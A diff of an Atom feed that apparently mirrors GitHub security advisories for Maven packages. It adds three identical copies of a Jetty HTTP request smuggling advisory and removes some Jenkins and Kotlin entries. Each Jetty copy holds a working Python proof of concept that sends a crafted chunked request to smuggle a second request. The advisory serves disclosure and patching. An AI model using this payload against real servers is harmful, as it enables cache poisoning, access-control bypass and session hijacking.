@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/maven.rss</id>
     <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
-    <updated>2026-08-14T18:04:39.491Z</updated>
+    <updated>2026-08-14T19:07:56.117Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
     <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
@@ -11,6 +11,471 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[org.eclipse.jetty:jetty-http] Jetty has HTTP Request Smuggling via Chunked Extension Quoted-String Parsing]]></title>
+        <id>https://github.com/advisories/GHSA-355h-qmc2-wpwf</id>
+        <link href="https://github.com/advisories/GHSA-355h-qmc2-wpwf"/>
+        <updated>2026-08-14T18:39:12.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="description-as-reported">Description (as reported)</h3>
+<p>Jetty incorrectly parses quoted strings in HTTP/1.1 chunked transfer encoding extension values, enabling request smuggling attacks.</p>
+<h3 id="background">Background</h3>
+<p>This vulnerability is a new variant discovered while researching the "Funky Chunks" HTTP request smuggling techniques:</p>
+<ul>
+<li><a href="https://w4ke.info/2025/06/18/funky-chunks.html">https://w4ke.info/2025/06/18/funky-chunks.html</a></li>
+<li><a href="https://w4ke.info/2025/10/29/funky-chunks-2.html">https://w4ke.info/2025/10/29/funky-chunks-2.html</a></li>
+</ul>
+<p>The original research tested various chunk extension parsing differentials but did not test quoted-string handling within extension values.</p>
+<h3 id="technical-details">Technical Details</h3>
+<p><strong>RFC 9112 Section 7.1.1</strong> defines chunked transfer encoding:</p>
+<pre><code>chunk = chunk-size [ chunk-ext ] CRLF chunk-data CRLF
+chunk-ext = *( BWS ";" BWS chunk-ext-name [ BWS "=" BWS chunk-ext-val ] )
+chunk-ext-val = token / quoted-string
+</code></pre>
+<p><strong>RFC 9110 Section 5.6.4</strong> defines quoted-string:</p>
+<pre><code>quoted-string = DQUOTE *( qdtext / quoted-pair ) DQUOTE
+</code></pre>
+<p>A quoted-string continues until the closing DQUOTE, and <code>\r\n</code> sequences are not permitted within the quotes.</p>
+<h3 id="vulnerability">Vulnerability</h3>
+<p>Jetty terminates chunk header parsing at <code>\r\n</code> inside quoted strings instead of treating this as an error.</p>
+<p><strong>Expected (RFC compliant):</strong></p>
+<pre><code>Chunk: 1;a="value\r\nhere"\r\n
+         ^^^^^^^^^^^^^^^^^^ extension value
+Body: [1 byte after the real \r\n]
+</code></pre>
+<p><strong>Actual (jetty):</strong></p>
+<pre><code>Chunk: 1;a="value
+            ^^^^^ terminates here (WRONG)
+Body: here"... treated as body/next request
+</code></pre>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+
+payload = (
+    b"POST / HTTP/1.1\r\n"
+    b"Host: localhost\r\n"
+    b"Transfer-Encoding: chunked\r\n"
+    b"\r\n"
+    b'1;a="\r\n'
+    b"X\r\n"
+    b"0\r\n"
+    b"\r\n"
+    b"GET /smuggled HTTP/1.1\r\n"
+    b"Host: localhost\r\n"
+    b"Content-Length: 11\r\n"
+    b"\r\n"
+    b'"\r\n'
+    b"Y\r\n"
+    b"0\r\n"
+    b"\r\n"
+)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(3)
+sock.connect(("127.0.0.1", 8080))
+sock.sendall(payload)
+
+response = b""
+while True:
+    try:
+        chunk = sock.recv(4096)
+        if not chunk:
+            break
+        response += chunk
+    except socket.timeout:
+        break
+
+sock.close()
+print(f"Responses: {response.count(b'HTTP/')}")
+print(response.decode(errors="replace"))
+</code></pre>
+<p><strong>Result:</strong> Server returns 2 HTTP responses from a single TCP connection.</p>
+<h4 id="parsing-breakdown">Parsing Breakdown</h4>
+<table>
+<thead>
+<tr>
+<th>Parser</th>
+<th>Request 1</th>
+<th>Request 2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jetty (vulnerable)</td>
+<td>POST / body="X"</td>
+<td>GET /smuggled (SMUGGLED!)</td>
+</tr>
+<tr>
+<td>RFC compliant</td>
+<td>POST / body="Y"</td>
+<td>(none - smuggled request hidden in extension)</td>
+</tr>
+</tbody></table>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Request Smuggling</strong>: Attacker injects arbitrary HTTP requests</li>
+<li><strong>Cache Poisoning</strong>: Smuggled responses poison shared caches</li>
+<li><strong>Access Control Bypass</strong>: Smuggled requests bypass frontend security</li>
+<li><strong>Session Hijacking</strong>: Smuggled requests can steal other users' responses</li>
+</ul>
+<h3 id="reproduction">Reproduction</h3>
+<ol>
+<li>Start the minimal POC with docker</li>
+<li>Run the poc script provided in same zip</li>
+</ol>
+<h3 id="suggested-fix">Suggested Fix</h3>
+<p>Ensure the chunk framing and extensions are parsed exactly as specified in RFC9112. 
+A CRLF inside a quoted-string should be considered a parsing error and not a line terminator.</p>
+<h3 id="patches">Patches</h3>
+<p>No patches yet.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No workarounds yet.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>RFC 9110: HTTP Semantics (Sections 5.6.4, 7.1.1)</li>
+<li>Funky Chunks Research: <a href="https://w4ke.info/2025/06/18/funky-chunks.html">https://w4ke.info/2025/06/18/funky-chunks.html</a></li>
+<li>details for security versions <a href="https://jetty.org/security.html">https://jetty.org/security.html</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/jetty/jetty.project/security/advisories/GHSA-355h-qmc2-wpwf">https://github.com/jetty/jetty.project/security/advisories/GHSA-355h-qmc2-wpwf</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2332">https://nvd.nist.gov/vuln/detail/CVE-2026-2332</a></li>
+<li><a href="https://gitlab.eclipse.org/security/cve-assignment/-/issues/89">https://gitlab.eclipse.org/security/cve-assignment/-/issues/89</a></li>
+<li><a href="https://w4ke.info/2025/06/18/funky-chunks.html">https://w4ke.info/2025/06/18/funky-chunks.html</a></li>
+<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-2332.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-2332.json</a></li>
+<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2458187">https://bugzilla.redhat.com/show_bug.cgi?id=2458187</a></li>
+<li><a href="https://access.redhat.com/security/cve/CVE-2026-2332">https://access.redhat.com/security/cve/CVE-2026-2332</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50263">https://access.redhat.com/errata/RHSA-2026:50263</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50223">https://access.redhat.com/errata/RHSA-2026:50223</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50222">https://access.redhat.com/errata/RHSA-2026:50222</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50221">https://access.redhat.com/errata/RHSA-2026:50221</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:25089">https://access.redhat.com/errata/RHSA-2026:25089</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:22453">https://access.redhat.com/errata/RHSA-2026:22453</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:21773">https://access.redhat.com/errata/RHSA-2026:21773</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:20568">https://access.redhat.com/errata/RHSA-2026:20568</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:17668">https://access.redhat.com/errata/RHSA-2026:17668</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:14272">https://access.redhat.com/errata/RHSA-2026:14272</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:10175">https://access.redhat.com/errata/RHSA-2026:10175</a></li>
+<li><a href="https://github.com/advisories/GHSA-355h-qmc2-wpwf">https://github.com/advisories/GHSA-355h-qmc2-wpwf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-355h-qmc2-wpwf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-14T23:40:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[org.eclipse.jetty:jetty-http] Jetty has HTTP Request Smuggling via Chunked Extension Quoted-String Parsing]]></title>
+        <id>https://github.com/advisories/GHSA-355h-qmc2-wpwf</id>
+        <link href="https://github.com/advisories/GHSA-355h-qmc2-wpwf"/>
+        <updated>2026-08-14T18:39:12.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="description-as-reported">Description (as reported)</h3>
+<p>Jetty incorrectly parses quoted strings in HTTP/1.1 chunked transfer encoding extension values, enabling request smuggling attacks.</p>
+<h3 id="background">Background</h3>
+<p>This vulnerability is a new variant discovered while researching the "Funky Chunks" HTTP request smuggling techniques:</p>
+<ul>
+<li><a href="https://w4ke.info/2025/06/18/funky-chunks.html">https://w4ke.info/2025/06/18/funky-chunks.html</a></li>
+<li><a href="https://w4ke.info/2025/10/29/funky-chunks-2.html">https://w4ke.info/2025/10/29/funky-chunks-2.html</a></li>
+</ul>
+<p>The original research tested various chunk extension parsing differentials but did not test quoted-string handling within extension values.</p>
+<h3 id="technical-details">Technical Details</h3>
+<p><strong>RFC 9112 Section 7.1.1</strong> defines chunked transfer encoding:</p>
+<pre><code>chunk = chunk-size [ chunk-ext ] CRLF chunk-data CRLF
+chunk-ext = *( BWS ";" BWS chunk-ext-name [ BWS "=" BWS chunk-ext-val ] )
+chunk-ext-val = token / quoted-string
+</code></pre>
+<p><strong>RFC 9110 Section 5.6.4</strong> defines quoted-string:</p>
+<pre><code>quoted-string = DQUOTE *( qdtext / quoted-pair ) DQUOTE
+</code></pre>
+<p>A quoted-string continues until the closing DQUOTE, and <code>\r\n</code> sequences are not permitted within the quotes.</p>
+<h3 id="vulnerability">Vulnerability</h3>
+<p>Jetty terminates chunk header parsing at <code>\r\n</code> inside quoted strings instead of treating this as an error.</p>
+<p><strong>Expected (RFC compliant):</strong></p>
+<pre><code>Chunk: 1;a="value\r\nhere"\r\n
+         ^^^^^^^^^^^^^^^^^^ extension value
+Body: [1 byte after the real \r\n]
+</code></pre>
+<p><strong>Actual (jetty):</strong></p>
+<pre><code>Chunk: 1;a="value
+            ^^^^^ terminates here (WRONG)
+Body: here"... treated as body/next request
+</code></pre>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+
+payload = (
+    b"POST / HTTP/1.1\r\n"
+    b"Host: localhost\r\n"
+    b"Transfer-Encoding: chunked\r\n"
+    b"\r\n"
+    b'1;a="\r\n'
+    b"X\r\n"
+    b"0\r\n"
+    b"\r\n"
+    b"GET /smuggled HTTP/1.1\r\n"
+    b"Host: localhost\r\n"
+    b"Content-Length: 11\r\n"
+    b"\r\n"
+    b'"\r\n'
+    b"Y\r\n"
+    b"0\r\n"
+    b"\r\n"
+)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(3)
+sock.connect(("127.0.0.1", 8080))
+sock.sendall(payload)
+
+response = b""
+while True:
+    try:
+        chunk = sock.recv(4096)
+        if not chunk:
+            break
+        response += chunk
+    except socket.timeout:
+        break
+
+sock.close()
+print(f"Responses: {response.count(b'HTTP/')}")
+print(response.decode(errors="replace"))
+</code></pre>
+<p><strong>Result:</strong> Server returns 2 HTTP responses from a single TCP connection.</p>
+<h4 id="parsing-breakdown">Parsing Breakdown</h4>
+<table>
+<thead>
+<tr>
+<th>Parser</th>
+<th>Request 1</th>
+<th>Request 2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jetty (vulnerable)</td>
+<td>POST / body="X"</td>
+<td>GET /smuggled (SMUGGLED!)</td>
+</tr>
+<tr>
+<td>RFC compliant</td>
+<td>POST / body="Y"</td>
+<td>(none - smuggled request hidden in extension)</td>
+</tr>
+</tbody></table>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Request Smuggling</strong>: Attacker injects arbitrary HTTP requests</li>
+<li><strong>Cache Poisoning</strong>: Smuggled responses poison shared caches</li>
+<li><strong>Access Control Bypass</strong>: Smuggled requests bypass frontend security</li>
+<li><strong>Session Hijacking</strong>: Smuggled requests can steal other users' responses</li>
+</ul>
+<h3 id="reproduction">Reproduction</h3>
+<ol>
+<li>Start the minimal POC with docker</li>
+<li>Run the poc script provided in same zip</li>
+</ol>
+<h3 id="suggested-fix">Suggested Fix</h3>
+<p>Ensure the chunk framing and extensions are parsed exactly as specified in RFC9112. 
+A CRLF inside a quoted-string should be considered a parsing error and not a line terminator.</p>
+<h3 id="patches">Patches</h3>
+<p>No patches yet.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No workarounds yet.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>RFC 9110: HTTP Semantics (Sections 5.6.4, 7.1.1)</li>
+<li>Funky Chunks Research: <a href="https://w4ke.info/2025/06/18/funky-chunks.html">https://w4ke.info/2025/06/18/funky-chunks.html</a></li>
+<li>details for security versions <a href="https://jetty.org/security.html">https://jetty.org/security.html</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/jetty/jetty.project/security/advisories/GHSA-355h-qmc2-wpwf">https://github.com/jetty/jetty.project/security/advisories/GHSA-355h-qmc2-wpwf</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2332">https://nvd.nist.gov/vuln/detail/CVE-2026-2332</a></li>
+<li><a href="https://gitlab.eclipse.org/security/cve-assignment/-/issues/89">https://gitlab.eclipse.org/security/cve-assignment/-/issues/89</a></li>
+<li><a href="https://w4ke.info/2025/06/18/funky-chunks.html">https://w4ke.info/2025/06/18/funky-chunks.html</a></li>
+<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-2332.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-2332.json</a></li>
+<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2458187">https://bugzilla.redhat.com/show_bug.cgi?id=2458187</a></li>
+<li><a href="https://access.redhat.com/security/cve/CVE-2026-2332">https://access.redhat.com/security/cve/CVE-2026-2332</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50263">https://access.redhat.com/errata/RHSA-2026:50263</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50223">https://access.redhat.com/errata/RHSA-2026:50223</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50222">https://access.redhat.com/errata/RHSA-2026:50222</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50221">https://access.redhat.com/errata/RHSA-2026:50221</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:25089">https://access.redhat.com/errata/RHSA-2026:25089</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:22453">https://access.redhat.com/errata/RHSA-2026:22453</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:21773">https://access.redhat.com/errata/RHSA-2026:21773</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:20568">https://access.redhat.com/errata/RHSA-2026:20568</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:17668">https://access.redhat.com/errata/RHSA-2026:17668</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:14272">https://access.redhat.com/errata/RHSA-2026:14272</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:10175">https://access.redhat.com/errata/RHSA-2026:10175</a></li>
+<li><a href="https://github.com/advisories/GHSA-355h-qmc2-wpwf">https://github.com/advisories/GHSA-355h-qmc2-wpwf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-355h-qmc2-wpwf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-14T23:40:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[org.eclipse.jetty:jetty-http] Jetty has HTTP Request Smuggling via Chunked Extension Quoted-String Parsing]]></title>
+        <id>https://github.com/advisories/GHSA-355h-qmc2-wpwf</id>
+        <link href="https://github.com/advisories/GHSA-355h-qmc2-wpwf"/>
+        <updated>2026-08-14T18:39:12.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="description-as-reported">Description (as reported)</h3>
+<p>Jetty incorrectly parses quoted strings in HTTP/1.1 chunked transfer encoding extension values, enabling request smuggling attacks.</p>
+<h3 id="background">Background</h3>
+<p>This vulnerability is a new variant discovered while researching the "Funky Chunks" HTTP request smuggling techniques:</p>
+<ul>
+<li><a href="https://w4ke.info/2025/06/18/funky-chunks.html">https://w4ke.info/2025/06/18/funky-chunks.html</a></li>
+<li><a href="https://w4ke.info/2025/10/29/funky-chunks-2.html">https://w4ke.info/2025/10/29/funky-chunks-2.html</a></li>
+</ul>
+<p>The original research tested various chunk extension parsing differentials but did not test quoted-string handling within extension values.</p>
+<h3 id="technical-details">Technical Details</h3>
+<p><strong>RFC 9112 Section 7.1.1</strong> defines chunked transfer encoding:</p>
+<pre><code>chunk = chunk-size [ chunk-ext ] CRLF chunk-data CRLF
+chunk-ext = *( BWS ";" BWS chunk-ext-name [ BWS "=" BWS chunk-ext-val ] )
+chunk-ext-val = token / quoted-string
+</code></pre>
+<p><strong>RFC 9110 Section 5.6.4</strong> defines quoted-string:</p>
+<pre><code>quoted-string = DQUOTE *( qdtext / quoted-pair ) DQUOTE
+</code></pre>
+<p>A quoted-string continues until the closing DQUOTE, and <code>\r\n</code> sequences are not permitted within the quotes.</p>
+<h3 id="vulnerability">Vulnerability</h3>
+<p>Jetty terminates chunk header parsing at <code>\r\n</code> inside quoted strings instead of treating this as an error.</p>
+<p><strong>Expected (RFC compliant):</strong></p>
+<pre><code>Chunk: 1;a="value\r\nhere"\r\n
+         ^^^^^^^^^^^^^^^^^^ extension value
+Body: [1 byte after the real \r\n]
+</code></pre>
+<p><strong>Actual (jetty):</strong></p>
+<pre><code>Chunk: 1;a="value
+            ^^^^^ terminates here (WRONG)
+Body: here"... treated as body/next request
+</code></pre>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+
+payload = (
+    b"POST / HTTP/1.1\r\n"
+    b"Host: localhost\r\n"
+    b"Transfer-Encoding: chunked\r\n"
+    b"\r\n"
+    b'1;a="\r\n'
+    b"X\r\n"
+    b"0\r\n"
+    b"\r\n"
+    b"GET /smuggled HTTP/1.1\r\n"
+    b"Host: localhost\r\n"
+    b"Content-Length: 11\r\n"
+    b"\r\n"
+    b'"\r\n'
+    b"Y\r\n"
+    b"0\r\n"
+    b"\r\n"
+)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(3)
+sock.connect(("127.0.0.1", 8080))
+sock.sendall(payload)
+
+response = b""
+while True:
+    try:
+        chunk = sock.recv(4096)
+        if not chunk:
+            break
+        response += chunk
+    except socket.timeout:
+        break
+
+sock.close()
+print(f"Responses: {response.count(b'HTTP/')}")
+print(response.decode(errors="replace"))
+</code></pre>
+<p><strong>Result:</strong> Server returns 2 HTTP responses from a single TCP connection.</p>
+<h4 id="parsing-breakdown">Parsing Breakdown</h4>
+<table>
+<thead>
+<tr>
+<th>Parser</th>
+<th>Request 1</th>
+<th>Request 2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jetty (vulnerable)</td>
+<td>POST / body="X"</td>
+<td>GET /smuggled (SMUGGLED!)</td>
+</tr>
+<tr>
+<td>RFC compliant</td>
+<td>POST / body="Y"</td>
+<td>(none - smuggled request hidden in extension)</td>
+</tr>
+</tbody></table>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Request Smuggling</strong>: Attacker injects arbitrary HTTP requests</li>
+<li><strong>Cache Poisoning</strong>: Smuggled responses poison shared caches</li>
+<li><strong>Access Control Bypass</strong>: Smuggled requests bypass frontend security</li>
+<li><strong>Session Hijacking</strong>: Smuggled requests can steal other users' responses</li>
+</ul>
+<h3 id="reproduction">Reproduction</h3>
+<ol>
+<li>Start the minimal POC with docker</li>
+<li>Run the poc script provided in same zip</li>
+</ol>
+<h3 id="suggested-fix">Suggested Fix</h3>
+<p>Ensure the chunk framing and extensions are parsed exactly as specified in RFC9112. 
+A CRLF inside a quoted-string should be considered a parsing error and not a line terminator.</p>
+<h3 id="patches">Patches</h3>
+<p>No patches yet.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No workarounds yet.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>RFC 9110: HTTP Semantics (Sections 5.6.4, 7.1.1)</li>
+<li>Funky Chunks Research: <a href="https://w4ke.info/2025/06/18/funky-chunks.html">https://w4ke.info/2025/06/18/funky-chunks.html</a></li>
+<li>details for security versions <a href="https://jetty.org/security.html">https://jetty.org/security.html</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/jetty/jetty.project/security/advisories/GHSA-355h-qmc2-wpwf">https://github.com/jetty/jetty.project/security/advisories/GHSA-355h-qmc2-wpwf</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2332">https://nvd.nist.gov/vuln/detail/CVE-2026-2332</a></li>
+<li><a href="https://gitlab.eclipse.org/security/cve-assignment/-/issues/89">https://gitlab.eclipse.org/security/cve-assignment/-/issues/89</a></li>
+<li><a href="https://w4ke.info/2025/06/18/funky-chunks.html">https://w4ke.info/2025/06/18/funky-chunks.html</a></li>
+<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-2332.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-2332.json</a></li>
+<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2458187">https://bugzilla.redhat.com/show_bug.cgi?id=2458187</a></li>
+<li><a href="https://access.redhat.com/security/cve/CVE-2026-2332">https://access.redhat.com/security/cve/CVE-2026-2332</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50263">https://access.redhat.com/errata/RHSA-2026:50263</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50223">https://access.redhat.com/errata/RHSA-2026:50223</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50222">https://access.redhat.com/errata/RHSA-2026:50222</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:50221">https://access.redhat.com/errata/RHSA-2026:50221</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:25089">https://access.redhat.com/errata/RHSA-2026:25089</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:22453">https://access.redhat.com/errata/RHSA-2026:22453</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:21773">https://access.redhat.com/errata/RHSA-2026:21773</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:20568">https://access.redhat.com/errata/RHSA-2026:20568</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:17668">https://access.redhat.com/errata/RHSA-2026:17668</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:14272">https://access.redhat.com/errata/RHSA-2026:14272</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:10175">https://access.redhat.com/errata/RHSA-2026:10175</a></li>
+<li><a href="https://github.com/advisories/GHSA-355h-qmc2-wpwf">https://github.com/advisories/GHSA-355h-qmc2-wpwf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-355h-qmc2-wpwf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-14T23:40:31.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins does not encrypt secrets from POST config.xml submissions before storing them in job configurations]]></title>
         <id>https://github.com/advisories/GHSA-m6wv-wh8g-64xc</id>
@@ -439,82 +904,5 @@
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-06-10T15:31:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins arbitrary type deserialization from attacker-controlled config.xml allows remote code execution and user impersonation]]></title>
-        <id>https://github.com/advisories/GHSA-g2xq-2v27-4rh3</id>
-        <link href="https://github.com/advisories/GHSA-g2xq-2v27-4rh3"/>
-        <updated>2026-08-13T18:20:02.000Z</updated>
-        <content type="html"><![CDATA[<p>In Jenkins 2.567 and earlier, LTS 2.555.2 and earlier, it is possible for attackers to have Jenkins deserialize arbitrary types defined in Jenkins core or plugins from an attacker-controlled <code>config.xml</code> submission in a way that allows them to handle HTTP requests afterwards.</p>
-<p>This can be used to impersonate any user and send HTTP requests on their behalf, up to and including use of the Script Console to run arbitrary code, or to read arbitrary files from the Jenkins controller.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53435">https://nvd.nist.gov/vuln/detail/CVE-2026-53435</a></li>
-<li><a href="https://www.jenkins.io/security/advisory/2026-06-10/#SECURITY-3707">https://www.jenkins.io/security/advisory/2026-06-10/#SECURITY-3707</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-53435">https://access.redhat.com/security/cve/CVE-2026-53435</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2487539">https://bugzilla.redhat.com/show_bug.cgi?id=2487539</a></li>
-<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-53435.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-53435.json</a></li>
-<li><a href="https://github.com/jenkinsci/jenkins/commit/345a3190a49d1ac96c4ff1c2e9eef4102c8d63f6">https://github.com/jenkinsci/jenkins/commit/345a3190a49d1ac96c4ff1c2e9eef4102c8d63f6</a></li>
-<li><a href="https://github.com/jenkinsci/jenkins/commit/d739f6a6266d">https://github.com/jenkinsci/jenkins/commit/d739f6a6266d</a></li>
-<li><a href="https://github.com/advisories/GHSA-g2xq-2v27-4rh3">https://github.com/advisories/GHSA-g2xq-2v27-4rh3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g2xq-2v27-4rh3</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-10T15:31:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins arbitrary type deserialization from attacker-controlled config.xml allows remote code execution and user impersonation]]></title>
-        <id>https://github.com/advisories/GHSA-g2xq-2v27-4rh3</id>
-        <link href="https://github.com/advisories/GHSA-g2xq-2v27-4rh3"/>
-        <updated>2026-08-13T18:20:02.000Z</updated>
-        <content type="html"><![CDATA[<p>In Jenkins 2.567 and earlier, LTS 2.555.2 and earlier, it is possible for attackers to have Jenkins deserialize arbitrary types defined in Jenkins core or plugins from an attacker-controlled <code>config.xml</code> submission in a way that allows them to handle HTTP requests afterwards.</p>
-<p>This can be used to impersonate any user and send HTTP requests on their behalf, up to and including use of the Script Console to run arbitrary code, or to read arbitrary files from the Jenkins controller.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53435">https://nvd.nist.gov/vuln/detail/CVE-2026-53435</a></li>
-<li><a href="https://www.jenkins.io/security/advisory/2026-06-10/#SECURITY-3707">https://www.jenkins.io/security/advisory/2026-06-10/#SECURITY-3707</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-53435">https://access.redhat.com/security/cve/CVE-2026-53435</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2487539">https://bugzilla.redhat.com/show_bug.cgi?id=2487539</a></li>
-<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-53435.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-53435.json</a></li>
-<li><a href="https://github.com/jenkinsci/jenkins/commit/345a3190a49d1ac96c4ff1c2e9eef4102c8d63f6">https://github.com/jenkinsci/jenkins/commit/345a3190a49d1ac96c4ff1c2e9eef4102c8d63f6</a></li>
-<li><a href="https://github.com/jenkinsci/jenkins/commit/d739f6a6266d">https://github.com/jenkinsci/jenkins/commit/d739f6a6266d</a></li>
-<li><a href="https://github.com/advisories/GHSA-g2xq-2v27-4rh3">https://github.com/advisories/GHSA-g2xq-2v27-4rh3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g2xq-2v27-4rh3</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-10T15:31:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[org.jetbrains.kotlin:kotlin-gradle-plugin] JetBrains Kotlin: Unsafe Deserialization in Kotlin Build Cache Enables Code Execution]]></title>
-        <id>https://github.com/advisories/GHSA-r937-wjx7-w2jp</id>
-        <link href="https://github.com/advisories/GHSA-r937-wjx7-w2jp"/>
-        <updated>2026-08-12T19:25:24.000Z</updated>
-        <content type="html"><![CDATA[<p>In JetBrains Kotlin before 2.4.20 code execution was possible via unsafe deserialization in the build cache metadata</p>
-<h3 id="references">References</h3>
-<ul>
